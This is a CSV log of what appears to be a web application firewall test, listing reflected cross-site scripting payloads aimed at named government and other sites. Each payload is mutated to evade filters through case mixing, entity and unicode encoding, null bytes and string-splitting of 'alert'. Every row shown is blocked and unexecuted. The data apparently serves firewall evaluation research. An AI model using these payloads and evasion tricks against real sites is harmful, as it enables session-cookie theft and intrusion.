status,label,executed,payload,family,base_i,name,algo,zip,target,lstm_success
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</A><Script>alert(document.cookie);</scrIPt>&startrow=""></a>testicles<SCriPT>alert(document.cookie);</sCrIpt>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&startrow=""></a>testicles<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a></a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"//www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&startrow=""></a>testicles<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>/drfv/
alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert`document.cookie`;</script>&startrow=""></a>testicles<script>alert`document.cookie`;</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,http://www.corp-gov.ru/forum/index.php3?node_id=1936>test</a><script>alert(document.cookie);</script>&startrow=></a>testicles<script>alert(document.cookie);</script>,diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&startrow=""></a>testicles<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>top['al'+'ert'](document.cookie);</script>&startrow=""></a>testicles<script>top['al'+'ert'](document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>top[8680439..toString(30)](document.cookie);</script>&startrow=""></a>testicles<script>top[8680439..toString(30)](document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">testsearch?q=ok </a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a <!--x-->><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a%00><script>alert(document.cookie);</script>&startrow=""></a>testicles<script>alert(document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://www.corp-gov.ru/forum/index.php3?node_id=1936"">test</a><script>top[/al/.source+/ert/.source](document.cookie);</script>&startrow=""></a>testicles<script>top[/al/.source+/ert/.source](document.cookie);</script>",diverse_table2,14.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><scrIPT>alert(document.cookie);</sCRIPt>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"//bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>/drfv/
alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert`document.cookie`;</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=><script>alert(document.cookie);</script>,diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>top['al'+'ert'](document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>top[8680439..toString(30)](document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid="">search?q=ok <script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script <!--x-->>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid="">%00<script>alert(document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,"http://bulletin.nhcsec.gov.tw:8880/school/discuss/register.php?prgid=""><script>top[/al/.source+/ert/.source](document.cookie);</script>",diverse_table2,15.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<ScriPT>alert(document.cookie);</SCrIpt>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script><script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,//ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,"http://ufo.gov.ru/search/?string=<script>/drfv/
alert(document.cookie);</script>>",diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert`document.cookie`;</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>top['al'+'ert'](document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>top[8680439..toString(30)](document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=search?q=ok <script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script <!--x-->>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script%00>alert(document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://ufo.gov.ru/search/?string=<script>top[/al/.source+/ert/.source](document.cookie);</script>>,diverse_table2,16.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<sCRIpT>alert(document.cookie);</sCriPt>&h=<sCRIPT>alert(document.cookie);</scRIPT>&url=google.com></iFrAMe><SCriPt>alert(document.cookie);</scripT>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&h=<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>&url=google.com></iframe><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script><script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,//www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&h=<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>&url=google.com></iframe><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,"http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>/drfv/
alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>",diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert`document.cookie`;</script>&h=<script>alert`document.cookie`;</script>&url=google.com></iframe><script>alert`document.cookie`;</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&h=<script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>&url=google.com></iframe><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>top['al'+'ert'](document.cookie);</script>&h=<script>top['al'+'ert'](document.cookie);</script>&url=google.com></iframe><script>top['al'+'ert'](document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>top[8680439..toString(30)](document.cookie);</script>&h=<script>top[8680439..toString(30)](document.cookie);</script>&url=google.com></iframe><script>top[8680439..toString(30)](document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=search?q=ok <script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script <!--x-->>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=%00<script>alert(document.cookie);</script>&h=<script>alert(document.cookie);</script>&url=google.com></iframe><script>alert(document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,http://www.ttdaren.gov.tw/daren/instpage.php?r=&w=<script>top[/al/.source+/ert/.source](document.cookie);</script>&h=<script>top[/al/.source+/ert/.source](document.cookie);</script>&url=google.com></iframe><script>top[/al/.source+/ert/.source](document.cookie);</script>,diverse_table2,17.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</A><SCRiPt>alert(document.cookie);</ScRiPt>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a></a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"//mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>/drfv/
alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert`document.cookie`;</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles>a</a><script>alert(document.cookie);</script>,diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>\u0061\u006c\u0065\u0072\u0074(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>top['al'+'ert'](document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>top[8680439..toString(30)](document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">asearch?q=ok </a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a <!--x-->><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a%00><script>alert(document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,"http://mail.chi-chi.gov.tw/4images/register.php?sessionid=testicles"">a</a><script>top[/al/.source+/ert/.source](document.cookie);</script>",diverse_table2,18.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<scRipT>alert(document.cookie);</SCript>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script><script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,//www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>&#97;&#108;&#101;&#114;&#116;(document.cookie);</script>,diverse_table2,19.0,,,,,
403,BLOCK,False,http://www.podzem.ru/send.php?f_feedbackname=<script>alert(document.cookie);</script>,diverse_table2,19.0,,,,,
